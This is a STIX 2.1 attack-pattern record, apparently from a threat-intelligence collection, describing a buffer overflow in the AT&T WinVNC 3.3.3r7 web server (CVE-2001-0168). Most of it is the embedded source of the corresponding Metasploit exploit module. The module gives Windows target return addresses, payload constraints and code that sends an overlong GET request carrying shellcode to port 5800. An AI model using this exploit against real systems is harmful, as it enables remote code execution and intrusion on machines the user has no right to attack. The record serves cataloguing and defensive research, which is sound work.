{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--20f35dcd-9290-4b87-a196-80f4df8c2497",
    "created": "2024-08-14T16:48:50.776962Z",
    "modified": "2024-08-14T16:48:50.776966Z",
    "name": "WinVNC Web Server GET Overflow",
    "description": " This module exploits a buffer overflow in the AT&T WinVNC version <= v3.3.3r7 web server. When debugging mode with logging is enabled (non-default), an overly long GET request can overwrite the stack. This exploit does not work well with VNC payloads! ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/vnc/winvnc_http_get.rb",
            "external_id": "winvnc_http_get.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0168"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'WinVNC Web Server GET Overflow',\n      'Description'\t=> %q{\n        This module exploits a buffer overflow in the AT&T WinVNC version\n        <= v3.3.3r7 web server. When debugging mode with logging is\n        enabled (non-default), an overly long GET request can overwrite\n        the stack. This exploit does not work well with VNC payloads!\n      },\n      'Author' \t=> 'aushack',\n      'License'       => MSF_LICENSE,\n      'References'    =>\n      [\n        [ 'BID', '2306' ],\n        [ 'OSVDB', '6280' ],\n        [ 'CVE', '2001-0168' ],\n      ],\n      'Privileged'\t\t=> true,\n      'DefaultOptions'\t=>\n      {\n        'EXITFUNC'\t=> 'thread',\n      },\n      'Payload'\t\t=>\n        {\n          'Space'\t\t\t=> 979,\n          'BadChars' \t\t=> \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x0b\",\n          'StackAdjustment' \t=> -3500,\n        },\n      'Platform' => ['win'],\n      'Targets'  =>\n      [\n        [ 'Windows NT4 SP3-6', \t{ 'Ret' => 0x779f4e39 } ], # push esp, ret msvcrt.dll\n        [ 'Windows 2000 SP1-4', { 'Ret' => 0x77bba3af } ], # jmp esp comctl32.dll\n        [ 'Windows XP SP0-1', \t{ 'Ret' => 0x71ab7bfb } ], # jmp esp ws2_32.dll\n      ],\n      'DisclosureDate' => '2001-01-29',\n      'DefaultTarget' => 1))\n\n      register_options(\n      [\n        Opt::RPORT(5800),\n      ])\n  end\n\n  def exploit\n\n    sploit = '/' + payload.encoded + [target['Ret']].pack('V')\n    sploit << make_nops(8) + Rex::Arch::X86.jmp(0xfffffc1c)\n\n    res = send_request_raw({\n      'uri'          => sploit,\n      'method'       => 'GET',\n    }, 5)\n\n    handler\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-01-29",
    "x_mitre_platforms": [
        "['win']"
    ]
}